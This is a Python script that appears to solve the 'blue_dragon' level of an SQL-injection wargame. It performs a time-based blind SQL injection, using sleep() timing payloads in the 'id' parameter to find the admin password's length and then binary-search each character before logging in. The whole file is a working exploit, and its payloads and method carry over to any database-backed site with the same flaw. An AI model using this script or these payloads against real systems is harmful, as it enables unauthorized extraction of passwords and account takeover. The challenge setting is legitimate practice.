import requests
import os
import time

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/blue_dragon_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

pw_length = 0

for  i in range(1, 100):

    start = time.time()
    res = requests.get(url, params={'id': f'admin\' and if({i} = length(pw), sleep(1), 0) #'},cookies=cookie)
    end = time.time()
    if (end - start) > 1:
        pw_length = i
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        start = time.time()
        res = requests.get(url, params={'id': f'admin\' and if({target} <= ascii(substr(pw,{i+1},1)), sleep(1), 0) #'},cookies=cookie)
        end = time.time()
        if (end - start) > 1:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: {ans}")

res = requests.get(url, params={'id': 'admin', 'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
